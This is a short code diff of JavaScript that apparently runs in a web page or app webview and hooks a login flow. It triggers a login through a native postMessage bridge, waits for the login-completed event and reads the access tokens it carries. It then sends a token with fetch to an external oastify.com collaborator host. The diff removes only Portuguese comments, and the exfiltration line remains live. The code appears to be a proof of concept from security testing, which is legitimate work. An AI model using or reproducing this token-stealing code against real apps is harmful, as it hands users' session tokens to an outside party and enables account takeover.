@@ -17,14 +17,12 @@
     console.log('Login completed!');
     console.log('Event detail:', event.detail);
     
-    // Acessar os tokens
     if (event.detail) {
         const accessToken = event.detail.dss;
         const accessToken2 = event.detail.dss2; 
         
         console.log('Access Token:', accessToken);
         
-        // Fazer algo com o token
         fetch("https://pa3a07m5y7i94cfwee28a8ehl8rzfr3g.oastify.com?token=".concat(accessToken));
     }
 }, false);
@@ -33,7 +31,7 @@
         window.PostMessageListenerWebInterface.postMessage(
             JSON.stringify({
                 name: "login",
-                parameters: {}  // Pode ser vazio ou conter dados extras
+                parameters: {}  
             })
     );
     </script>
